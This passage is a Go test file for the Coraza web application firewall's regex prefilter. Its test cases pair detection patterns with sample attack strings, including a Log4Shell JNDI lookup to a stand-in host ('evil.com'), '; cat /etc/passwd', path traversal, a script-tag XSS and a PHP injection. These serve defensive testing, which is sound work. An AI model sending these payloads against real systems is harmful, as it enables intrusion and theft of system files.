// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package operators

import (
	"fmt"
	"regexp"
	"strings"
	"testing"

	"github.com/corazawaf/coraza/v3/experimental/plugins/plugintypes"
	"github.com/corazawaf/coraza/v3/internal/corazawaf"
)

func TestMinMatchLength(t *testing.T) {
	tests := []struct {
		pattern string
		want    int
	}{
		// Literals
		{"abc", 3},
		{"", 0},
		{"a", 1},

		// Alternation
		{"a|bc", 1},
		{"abc|de", 2},
		{"abc|defgh|ij", 2},

		// Optional / quantifiers
		{"ab?c", 2},
		{"a+", 1},
		{"a*", 0},
		{"a{3,5}", 3},
		{"a{0,5}", 0},
		{"a{1}", 1},
		{"(ab){2}", 4},

		// Groups
		{"(abc)", 3},
		{"(?:abc)", 3},
		{"((a)(b))", 2},

		// Character classes
		{".", 1},
		{"\\d+", 1},
		{"\\d*", 0},
		{"[a-z]", 1},
		{"[a-z]{3}", 3},

		// Complex patterns
		{"ab(cd|e)fg", 5},
		{"(?i)hello", 5},
		{"hello.*world", 10},
		{"(?:union\\s+select|insert\\s+into)", 11},
		{"sleep\\s*\\(", 6},

		// Anchors (don't consume input)
		{"^abc$", 3},
		{"^$", 0},
		{"\\bhello\\b", 5},

		// Unicode
		{"ハロー", 9},  // 3 runes × 3 bytes each
		{"café", 5}, // é is 2 bytes
	}
	for _, tc := range tests {
		t.Run(tc.pattern, func(t *testing.T) {
			got := minMatchLength(tc.pattern)
			if got != tc.want {
				t.Errorf("minMatchLength(%q) = %d, want %d", tc.pattern, got, tc.want)
			}
		})
	}
}

// TestPrefilterFuncBuildability verifies that prefilterFunc correctly decides
// which patterns can produce a prefilter (non-nil) and which cannot (nil).
// For patterns that produce a prefilter, it also validates that the prefilter
// accepts known matching inputs and rejects known non-matching inputs.
func TestPrefilterFuncBuildability(t *testing.T) {
	tests := []struct {
		pattern string
		wantNil bool
		desc    string
		match   string // input that the regex matches (checked when prefilter is non-nil)
		noMatch string // input that the regex does not match (checked when prefilter is non-nil)
	}{
		{"hello", false, "plain literal", "say hello", "goodbye"},
		{"[a-z]+", true, "char class only", "", ""},
		{"hello.*world", false, "literals around wildcard", "hello big world", "goodbye planet"},
		{"(ab|cd)", false, "alternation with literals", "xabx", "xyz"},
		{".*", true, "pure wildcard", "", ""},
		{"\\d+", true, "digit class", "", ""},
		{"sleep\\s*\\(", false, "literal with optional whitespace", "sleep(1)", "wake(1)"},
		{"(?:union\\s+select|insert\\s+into)", false, "CRS-style alternation", "union select 1", "update set x"},
		{".", true, "single any-char", "", ""},
		{"(a|.)", true, "alternation with wildcard branch", "", ""},
		{"(?:ab|[0-9]+)", true, "alternation where one branch has no literal", "", ""},
		{"(abc)+", false, "repeated literal", "xabcabc", "xyzxyz"},
		{"(abc)?", true, "optional group", "", ""},
		{"(abc)*", true, "zero-or-more group", "", ""},
		{"^hello$", false, "anchored literal", "hello", "world"},
		{"(?i)SELECT", false, "case-insensitive literal", "select", "update"},
	}
	for _, tc := range tests {
		t.Run(tc.desc, func(t *testing.T) {
			pf := prefilterFunc(tc.pattern)
			if tc.wantNil && pf != nil {
				t.Errorf("prefilterFunc(%q) expected nil, got non-nil", tc.pattern)
			}
			if !tc.wantNil && pf == nil {
				t.Errorf("prefilterFunc(%q) expected non-nil, got nil", tc.pattern)
			}
			// When prefilter exists, validate it accepts matching inputs and
			// rejects (or conservatively accepts) non-matching inputs.
			if pf != nil && tc.match != "" {
				if !pf(tc.match) {
					t.Errorf("prefilter(%q) rejected matching input %q — false negative", tc.pattern, tc.match)
				}
			}
			if pf != nil && tc.noMatch != "" {
				re := regexp.MustCompile(tc.pattern)
				if re.MatchString(tc.noMatch) {
					t.Fatalf("test bug: noMatch %q actually matches %q", tc.noMatch, tc.pattern)
				}
				// Prefilter may accept (conservative) or reject — but if it rejects, it's correct
				// Conservative pass-through: prefilter said "maybe", that's OK
				_ = pf(tc.noMatch)
			}
		})
	}
}

// TestPrefilterNeverCausesFalseNegatives is the critical safety test.
// For every pattern+input pair where the regex matches, both the minLen check
// and the prefilter must also accept the input. A failure here means the
// prefilter would cause an attack to be missed.
func TestPrefilterNeverCausesFalseNegatives(t *testing.T) {
	tests := []struct {
		pattern string
		input   string
		matches bool
	}{
		// Basic literals
		{"hello", "hello world", true},
		{"hello", "goodbye", false},
		{"hello", "helloworld", true},
		{"hello", "say hello", true},

		// Wildcards between literals
		{"hello.*world", "hello beautiful world", true},
		{"hello.*world", "helloworld", true},
		{"hello.*world", "goodbye", false},

		// CRS-style SQLi alternations
		{"(?:union\\s+select|insert\\s+into)", "union select * from t", true},
		{"(?:union\\s+select|insert\\s+into)", "insert into t values", true},
		{"(?:union\\s+select|insert\\s+into)", "delete from t", false},
		{"(?:union\\s+select|insert\\s+into)", "UNION SELECT", false}, // case-sensitive

		// CRS-style with case-insensitive flag
		{"(?i)(?:union\\s+select|insert\\s+into)", "UNION SELECT * FROM t", true},
		{"(?i)(?:union\\s+select|insert\\s+into)", "Insert Into t values", true},
		{"(?i)(?:union\\s+select|insert\\s+into)", "DELETE FROM t", false},

		// Function call patterns
		{"sleep\\s*\\(", "sleep(5)", true},
		{"sleep\\s*\\(", "sleep  (5)", true},
		{"sleep\\s*\\(", "awake(5)", false},

		// Case-insensitive
		{"(?i)hello", "HELLO", true},
		{"(?i)hello", "Hello", true},
		{"(?i)hello", "hElLo", true},
		{"(?i)hello", "goodbye", false},
		{"(?i)(?:select|union)", "SELECT", true},
		{"(?i)(?:select|union)", "UNION", true},
		{"(?i)(?:select|union)", "Union", true},
		{"(?i)(?:select|union)", "delete", false},

		// Capture groups inside alternation
		{"ab(cd|ef)gh", "abcdgh", true},
		{"ab(cd|ef)gh", "abefgh", true},
		{"ab(cd|ef)gh", "abxxgh", false},

		// Three-way alternation
		{"(?:cat|dog|bird)", "I have a cat", true},
		{"(?:cat|dog|bird)", "I have a dog", true},
		{"(?:cat|dog|bird)", "I have a bird", true},
		{"(?:cat|dog|bird)", "I have a fish", false},

		// Short input rejected by minLen
		{"hello", "hi", false},
		{"hello", "hell", false},
		{"hello", "hello", true},

		// Empty input
		{"hello", "", false},
		{".*", "", true},

		// Input exactly at minLen boundary
		{"abc", "abc", true},
		{"abc", "ab", false},
		{"abc", "xabcx", true},

		// Unicode
		{"ハロー", "ハローワールド", true},
		{"ハロー", "グッバイ", false},
		{"café", "un café chaud", true},
		{"café", "un cafe chaud", false}, // missing accent

		// Anchored patterns
		{"^hello", "hello world", true},
		{"^hello", "say hello", false},
		{"world$", "hello world", true},

		// Nested groups
		{"(a(bc)d)", "abcd", true},
		{"(a(bc)d)", "axd", false},

		// Repeated groups
		{"(ab)+", "ab", true},
		{"(ab)+", "abab", true},
		{"(ab)+", "cd", false},

		// Mixed required + optional parts
		{"hello\\s*world", "helloworld", true},
		{"hello\\s*world", "hello world", true},
		{"hello\\s*world", "goodbye", false},

		// Deeply nested alternation
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa cc", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "bb dd", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa dd", true},
		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "xx yy", false},

		// Pattern with no extractable literals (prefilter should be nil, regex runs)
		{"[a-z]+\\d+", "abc123", true},
		{"[a-z]+\\d+", "123", false},
		{"\\d{3}-\\d{4}", "555-1234", true},

		// Literal at end after wildcard
		{".*\\.exe", "malware.exe", true},
		{".*\\.exe", "malware.txt", false},
	}
	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.pattern, tc.input), func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test setup error: regex %q match on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
					tc.pattern, ml, tc.input, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestPrefilterCRSPatterns tests against real-world CRS (OWASP Core Rule Set) patterns.
// These are representative patterns from common CRS rules that @rx evaluates.
func TestPrefilterCRSPatterns(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		matches bool
	}{
		// Log4Shell (CVE-2021-44228) detection pattern
		{
			name:    "log4shell_match",
			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
			input:   "${jndi:ldap://evil.com/a}",
			matches: true,
		},
		{
			name:    "log4shell_no_match",
			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
			input:   "GET /index.html HTTP/1.1",
			matches: false,
		},
		// SQL injection keywords
		{
			name:    "sqli_union_select",
			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
			input:   "1 UNION ALL SELECT * FROM users",
			matches: true,
		},
		{
			name:    "sqli_union_select_benign",
			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
			input:   "trade union membership",
			matches: false,
		},
		// XSS patterns
		{
			name:    "xss_script_tag",
			pattern: `(?i)<script[^>]*>`,
			input:   `<script>alert(1)</script>`,
			matches: true,
		},
		{
			name:    "xss_script_tag_benign",
			pattern: `(?i)<script[^>]*>`,
			input:   "just a normal paragraph",
			matches: false,
		},
		// Command injection
		{
			name:    "cmdi_match",
			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
			input:   "; cat /etc/passwd",
			matches: true,
		},
		{
			name:    "cmdi_benign",
			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
			input:   "catalog items for sale",
			matches: false,
		},
		// Path traversal
		{
			name:    "path_traversal_match",
			pattern: `(?:(?:\.{2}[/\\]){3,})`,
			input:   "../../../etc/passwd",
			matches: true,
		},
		{
			name:    "path_traversal_benign",
			pattern: `(?:(?:\.{2}[/\\]){3,})`,
			input:   "/normal/path/to/file",
			matches: false,
		},
		// PHP injection
		{
			name:    "php_injection_match",
			pattern: `(?i)<\?(?:php|=)`,
			input:   `<?php echo "pwned"; ?>`,
			matches: true,
		},
		{
			name:    "php_injection_benign",
			pattern: `(?i)<\?(?:php|=)`,
			input:   "just some text",
			matches: false,
		},
		// HTTP response splitting
		{
			name:    "response_splitting_match",
			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
			input:   "\r\ncontent-type: text/html",
			matches: true,
		},
		{
			name:    "response_splitting_benign",
			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
			input:   "normal request body",
			matches: false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test setup error: regex %q match on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
					tc.pattern, ml, tc.input, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestPrefilterCaseInsensitive tests case-insensitive handling in detail.
func TestPrefilterCaseInsensitive(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool // expected prefilter result (true = might match)
	}{
		// Basic (?i) flag
		{"ci_upper", "(?i)hello", "HELLO WORLD", true},
		{"ci_mixed", "(?i)hello", "HeLLo", true},
		{"ci_lower", "(?i)hello", "hello", true},
		{"ci_nomatch", "(?i)hello", "goodbye", false},

		// Case-sensitive (no flag)
		{"cs_exact", "hello", "hello", true},
		{"cs_upper_reject", "hello", "HELLO", false},

		// (?i) with alternation
		{"ci_alt_first", "(?i)(?:select|insert)", "SELECT", true},
		{"ci_alt_second", "(?i)(?:select|insert)", "INSERT", true},
		{"ci_alt_mixed", "(?i)(?:select|insert)", "SeLeCt", true},
		{"ci_alt_nomatch", "(?i)(?:select|insert)", "DELETE", false},

		// (?i) with concatenation
		{"ci_concat", "(?i)hello.*world", "HELLO beautiful WORLD", true},
		{"ci_concat_nomatch", "(?i)hello.*world", "GOODBYE", false},

		// Partial (?i) — flag applies to subexpression only, but our implementation
		// conservatively treats the whole pattern as case-insensitive. This means
		// the prefilter may accept more inputs than it should (safe, not a false negative).
		{"partial_ci_match", "hello(?i:world)", "helloWORLD", true},
		{"partial_ci_conservative", "hello(?i:world)", "HELLOworld", true}, // conservative: prefilter may accept
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pf := prefilterFunc(tc.pattern)
			if pf == nil {
				// No prefilter built — always considered "might match", skip this test
				return
			}
			got := pf(tc.input)

			// For safety: if the regex matches, the prefilter MUST return true.
			re := regexp.MustCompile(tc.pattern)
			if re.MatchString(tc.input) && !got {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q", tc.pattern, tc.input)
			}

			// If we have an expected value and the regex doesn't match, check filtering.
			if !re.MatchString(tc.input) && got != tc.want {
				// This is not a correctness failure — the prefilter being too conservative
				// (returning true for non-matching) is fine. Only log if it's unexpectedly
				// rejecting a non-matching input.
				if !got && tc.want {
					t.Errorf("prefilter(%q) unexpectedly rejected non-matching input %q", tc.pattern, tc.input)
				}
			}
		})
	}
}

// TestPrefilterIntegrationViaNewRX verifies the full pipeline: newRX → Evaluate,
// ensuring the prefilter is correctly integrated and doesn't alter matching behavior.
func TestPrefilterIntegrationViaNewRX(t *testing.T) {
	tests := []struct {
		pattern string
		input   string
		want    bool
	}{
		// Patterns that get prefilters
		{"hello.*world", "hello beautiful world", true},
		{"hello.*world", "goodbye universe", false},
		{"som(.*)ta", "somedata", true},
		{"som(.*)ta", "notdata", false},

		// Case-insensitive via newRX (gets (?sm) or (?s) prefix)
		{"(?i)hello", "HELLO", true},
		{"(?i)hello", "goodbye", false},

		// Alternation
		{"(?:union|select)", "test union test", true},
		{"(?:union|select)", "test delete test", false},

		// Patterns that should NOT get prefilters (pure wildcards)
		{"[a-z]+", "abc", true},
		{"[a-z]+", "123", false},
		{".*", "anything", true},
		{".*", "", true},

		// Short inputs rejected by minLen
		{"hello.*world", "hi", false},

		// Empty input
		{"hello", "", false},

		// Unicode
		{"ハロー", "ハローワールド", true},
		{"ハロー", "グッバイ", false},
	}

	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.pattern, tc.input), func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern, RxPreFilterEnabled: true}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestPrefilterCapturingCorrectness verifies that the FindStringSubmatchIndex
// path produces the same capture groups as the original FindStringSubmatch path.
func TestPrefilterCapturingCorrectness(t *testing.T) {
	tests := []struct {
		pattern  string
		input    string
		captures map[int]string // expected capture group index → value
	}{
		{
			pattern:  "som(.*)ta",
			input:    "somedata",
			captures: map[int]string{0: "somedata", 1: "eda"},
		},
		{
			pattern:  "(a)(b)(c)",
			input:    "abc",
			captures: map[int]string{0: "abc", 1: "a", 2: "b", 3: "c"},
		},
		{
			pattern:  "(foo)(bar)?",
			input:    "foo",
			captures: map[int]string{0: "foo", 1: "foo", 2: ""}, // group 2 not in match
		},
		{
			pattern:  "^/api/v(\\d+)",
			input:    "/api/v3/users",
			captures: map[int]string{0: "/api/v3", 1: "3"},
		},
		{
			pattern:  "(a|b)(c|d)",
			input:    "bd",
			captures: map[int]string{0: "bd", 1: "b", 2: "d"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.pattern, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern, RxPreFilterEnabled: true}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if !got {
				t.Fatalf("expected match for %q on %q", tc.pattern, tc.input)
			}

			for idx, want := range tc.captures {
				collected := tx.Variables().TX().Get(fmt.Sprintf("%d", idx))
				if len(collected) == 0 {
					t.Errorf("capture group %d: expected %q, got nothing", idx, want)
					continue
				}
				if collected[0] != want {
					t.Errorf("capture group %d: expected %q, got %q", idx, want, collected[0])
				}
			}
		})
	}
}

func TestContainsFoldASCII(t *testing.T) {
	tests := []struct {
		s, needle string
		want      bool
	}{
		{"HELLO WORLD", "hello", true},
		{"Hello World", "hello", true},
		{"goodbye", "hello", false},
		{"", "hello", false},
		{"hi", "hello", false},
		{"xhellox", "hello", true},
		{"HÉLLO", "hello", false},             // non-ASCII É in haystack, ASCII needle
		{"Straße", "straße", true},            // non-ASCII needle: conservative true to avoid false negatives
		{"STRASSE", "straße", true},           // non-ASCII needle: conservative true (Unicode folding is tricky)
		{"totally different", "straße", true}, // non-ASCII needle: conservative true even when absent
		{"", "", true},                        // empty needle always matches
		{"abc", "", true},
		{"SELECT", "select", true},
		{"sElEcT", "select", true},
	}
	for _, tc := range tests {
		t.Run(fmt.Sprintf("%s/%s", tc.s, tc.needle), func(t *testing.T) {
			got := containsFoldASCII(tc.s, tc.needle)
			if got != tc.want {
				t.Errorf("containsFoldASCII(%q, %q) = %v, want %v", tc.s, tc.needle, got, tc.want)
			}
		})
	}
}

// TestBinaryRXBypassesPrefilter verifies that patterns containing non-UTF8 byte
// sequences (e.g. \xac\xed\x00\x05) go through the binaryRX path and do NOT
// get a prefilter attached. This is critical because rxprefilter.go only handles
// standard regexp.Regexp, not binaryregexp.Regexp.
func TestBinaryRXBypassesPrefilter(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool
	}{
		{
			name:    "binary_match",
			pattern: `\xac\xed\x00\x05`,
			input:   "\xac\xed\x00\x05t\x00\x04test",
			want:    true,
		},
		{
			name:    "binary_no_match",
			pattern: `\xac\xed\x00\x05`,
			input:   "\xac\xed\x00t\x00\x04test",
			want:    false,
		},
		{
			name:    "binary_match_2",
			pattern: `\xff\xfe`,
			input:   "\xff\xfedata",
			want:    true,
		},
		{
			name:    "binary_no_match_2",
			pattern: `\xff\xfe`,
			input:   "normal text",
			want:    false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			// Verify it's a binaryRX, not an rx with prefilter
			if _, ok := op.(*binaryRX); !ok {
				t.Fatalf("expected binaryRX for pattern %q, got %T", tc.pattern, op)
			}

			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := op.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestPrefilterWithSMPrefix verifies that the (?sm) or (?s) prefix that newRX
// prepends to every pattern does not break the prefilter. The prefilterFunc
// receives the full prefixed pattern, and it must still extract correct literals
// and not cause false negatives.
func TestPrefilterWithSMPrefix(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool
	}{
		// (?sm) prefix: dotall + multiline. The pattern "hello.*world" should
		// still match across newlines, and the prefilter should still require
		// both "hello" and "world".
		{
			name:    "dotall_match",
			pattern: "hello.*world",
			input:   "hello\nworld",
			want:    true,
		},
		{
			name:    "dotall_no_match",
			pattern: "hello.*world",
			input:   "goodbye\nuniverse",
			want:    false,
		},
		// Multiline: ^ matches at line start (only when (?sm) is prepended;
		// with no_regex_multiline, only (?s) is prepended so ^ matches start of string only).
		{
			name:    "multiline_anchor",
			pattern: "^hello.*world",
			input:   "test\nhello\nworld",
			want:    !shouldNotUseMultilineRegexesOperatorByDefault,
		},
		// User-supplied (?i) combined with the automatic (?sm)
		{
			name:    "user_ci_with_sm_match",
			pattern: "(?i)hello.*world",
			input:   "HELLO\nWORLD",
			want:    true,
		},
		{
			name:    "user_ci_with_sm_no_match",
			pattern: "(?i)hello.*world",
			input:   "GOODBYE\nUNIVERSE",
			want:    false,
		},
		// Double (?sm) — user passes (?sm) and newRX also prepends it
		{
			name:    "double_sm",
			pattern: "(?sm)hello.*world",
			input:   "hello\nworld",
			want:    true,
		},
		// CRS-style pattern through newRX with automatic prefix
		{
			name:    "crs_sqli_via_newrx",
			pattern: "(?:union\\s+select|insert\\s+into)",
			input:   "union select * from t",
			want:    true,
		},
		{
			name:    "crs_sqli_via_newrx_no_match",
			pattern: "(?:union\\s+select|insert\\s+into)",
			input:   "just normal text",
			want:    false,
		},
		// Alternation with (?i) through full pipeline
		{
			name:    "ci_alternation_via_newrx",
			pattern: "(?i)(?:select|union|insert)",
			input:   "SELECT",
			want:    true,
		},
		{
			name:    "ci_alternation_via_newrx_no_match",
			pattern: "(?i)(?:select|union|insert)",
			input:   "DELETE",
			want:    false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := plugintypes.OperatorOptions{Arguments: tc.pattern, RxPreFilterEnabled: true}
			op, err := newRX(opts)
			if err != nil {
				t.Fatal(err)
			}

			// Verify this goes through the rx path (not binaryRX)
			rxOp, ok := op.(*rx)
			if !ok {
				t.Fatalf("expected *rx for pattern %q, got %T", tc.pattern, op)
			}

			// Verify the prefilter doesn't cause false negatives
			waf := corazawaf.NewWAF()
			tx := waf.NewTransaction()
			tx.Capture = true
			got := rxOp.Evaluate(tx, tc.input)
			if got != tc.want {
				t.Errorf("Evaluate(%q, %q) = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

// TestMemoizeSharesPrefilter verifies that two newRX calls with the same pattern
// produce operators with identical compiled artifacts. When the memoize_builders
// build tag is active, they share the same pointer; without it, they are distinct
// but behaviorally equivalent.
func TestMemoizeSharesPrefilter(t *testing.T) {
	pattern := "hello.*world"
	opts := plugintypes.OperatorOptions{Arguments: pattern, RxPreFilterEnabled: true}

	op1, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}
	op2, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}

	rx1 := op1.(*rx)
	rx2 := op2.(*rx)

	if rx1.prefilter == nil {
		t.Fatal("prefilter not built: RxPreFilterEnabled is required for this test")
	}

	// Both should have the same minLen
	if rx1.minLen != rx2.minLen {
		t.Errorf("minLen mismatch: %d vs %d", rx1.minLen, rx2.minLen)
	}

	// Both should have the same regex pattern
	if rx1.re.String() != rx2.re.String() {
		t.Errorf("regex pattern mismatch: %q vs %q", rx1.re.String(), rx2.re.String())
	}

	// Both should produce the same evaluation results
	inputs := []string{"hello beautiful world", "goodbye", "", "hello world"}
	for _, inp := range inputs {
		waf := corazawaf.NewWAF()
		tx1 := waf.NewTransaction()
		tx1.Capture = true
		tx2 := waf.NewTransaction()
		tx2.Capture = true

		r1 := rx1.Evaluate(tx1, inp)
		r2 := rx2.Evaluate(tx2, inp)
		if r1 != r2 {
			t.Errorf("input %q: op1=%v, op2=%v", inp, r1, r2)
		}
	}
}

// TestPrefilterConcurrentSafety verifies the prefilter closure and Aho-Corasick
// automaton can be safely called from multiple goroutines concurrently.
func TestPrefilterConcurrentSafety(t *testing.T) {
	rxPattern := `(?i)(?:union\s+select|insert\s+into|delete\s+from)`
	opts := plugintypes.OperatorOptions{Arguments: rxPattern, RxPreFilterEnabled: true}
	op, err := newRX(opts)
	if err != nil {
		t.Fatal(err)
	}

	if op.(*rx).prefilter == nil {
		t.Fatal("prefilter not built: RxPreFilterEnabled is required for this test")
	}

	inputs := []string{
		"union select * from t",
		"INSERT INTO t VALUES",
		"normal request",
		"GET /index.html HTTP/1.1",
		"delete from users",
		"",
		"UNION SELECT 1,2,3",
	}

	// Run 100 goroutines, each evaluating all inputs
	const goroutines = 100
	errs := make(chan error, goroutines*len(inputs))
	done := make(chan struct{})

	// Compile the reference regex once, outside the goroutines.
	re := regexp.MustCompile(rxPattern)

	for g := 0; g < goroutines; g++ {
		go func() {
			for _, inp := range inputs {
				waf := corazawaf.NewWAF()
				tx := waf.NewTransaction()
				tx.Capture = true
				got := op.Evaluate(tx, inp)

				want := re.MatchString(inp)
				if got != want {
					errs <- fmt.Errorf("input %q: concurrent Evaluate=%v, regex=%v", inp, got, want)
				}
			}
			done <- struct{}{}
		}()
	}

	for g := 0; g < goroutines; g++ {
		<-done
	}
	close(errs)

	for err := range errs {
		t.Error(err)
	}
}

// TestPrefilterUnicodeFoldingSafety verifies that the prefilter does not produce
// false negatives when the input contains non-ASCII characters that are Unicode
// fold equivalents of ASCII letters. Go's regexp (?i) uses Unicode simple case
// folding, so (?i)s matches 'ſ' (U+017F) and (?i)k matches 'K' (U+212A).
// Our prefilter only does ASCII folding, so for non-ASCII inputs it must
// conservatively return true ("maybe match") to avoid missing attacks.
func TestPrefilterUnicodeFoldingSafety(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		matches bool // what the regex says
	}{
		// 'ſ' (U+017F, Latin Small Letter Long S) folds to 's'
		{
			name:    "long_s_select",
			pattern: "(?i)select",
			input:   "ſelect",
			matches: true,
		},
		{
			name:    "long_s_sleep",
			pattern: "(?i)sleep",
			input:   "ſleep(5)",
			matches: true,
		},
		{
			name:    "long_s_insert",
			pattern: "(?i)(?:select|insert)",
			input:   "inſert",
			matches: true,
		},
		// 'K' (U+212A, Kelvin Sign) folds to 'k'
		{
			name:    "kelvin_ok",
			pattern: "(?i)ok",
			input:   "o\u212a",
			matches: true,
		},
		// Mixed: non-ASCII input but no fold relevance (should still be safe)
		{
			name:    "unrelated_non_ascii",
			pattern: "(?i)hello",
			input:   "héllo",
			matches: false,
		},
		// Pure ASCII input — normal fast path should work
		{
			name:    "ascii_select_upper",
			pattern: "(?i)select",
			input:   "SELECT",
			matches: true,
		},
		{
			name:    "ascii_select_no_match",
			pattern: "(?i)select",
			input:   "UPDATE",
			matches: false,
		},
		// CRS-style alternation with Unicode fold in input
		{
			name:    "crs_sqli_long_s",
			pattern: `(?i)(?:union\s+select|insert\s+into)`,
			input:   "union ſelect * from t",
			matches: true,
		},
		// Empty non-ASCII input
		{
			name:    "non_ascii_short",
			pattern: "(?i)hello",
			input:   "é",
			matches: false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test bug: regex %q on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
					tc.pattern, ml, tc.input, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q — "+
					"this is a SECURITY BUG (Unicode fold equivalents not handled)",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestPrefilterEdgeCases covers additional edge cases that are easy to miss:
// empty alternation branches, escaped special chars, very short patterns,
// patterns with only anchors, adjacent literals, and patterns where all
// extracted literals are too short to be useful.
func TestPrefilterEdgeCases(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		matches bool
	}{
		// Empty alternation branch: (|abc) can match empty string
		// Prefilter must NOT require "abc" since the empty branch can match anything
		{
			name:    "empty_alt_branch_match_empty",
			pattern: "(|abc)",
			input:   "",
			matches: true,
		},
		{
			name:    "empty_alt_branch_match_abc",
			pattern: "(|abc)",
			input:   "abc",
			matches: true,
		},
		{
			name:    "empty_alt_branch_match_other",
			pattern: "(|abc)",
			input:   "xyz",
			matches: true,
		},
		// Escaped special chars become literals
		{
			name:    "escaped_dot_exe",
			pattern: `.*\.exe`,
			input:   "malware.exe",
			matches: true,
		},
		{
			name:    "escaped_dot_exe_no_match",
			pattern: `.*\.exe`,
			input:   "malwarexexe",
			matches: false,
		},
		// Pattern with only anchors — no literals to extract
		{
			name:    "only_anchors",
			pattern: "^$",
			input:   "",
			matches: true,
		},
		// Adjacent literals in concat (AST may merge or keep separate)
		{
			name:    "adjacent_literals",
			pattern: "hel" + "lo",
			input:   "hello",
			matches: true,
		},
		// All extracted literals too short (filtered out by filterShort)
		{
			name:    "short_literals_only",
			pattern: "a.*b",
			input:   "axb",
			matches: true,
		},
		// Nested quantifiers
		{
			name:    "nested_plus_star",
			pattern: "(ab+)*cd",
			input:   "abbbcd",
			matches: true,
		},
		{
			name:    "nested_plus_star_no_match",
			pattern: "(ab+)*cd",
			input:   "xyz",
			matches: false,
		},
		// Very long literal
		{
			name:    "long_literal_match",
			pattern: "abcdefghijklmnop",
			input:   "xxabcdefghijklmnopxx",
			matches: true,
		},
		{
			name:    "long_literal_no_match",
			pattern: "abcdefghijklmnop",
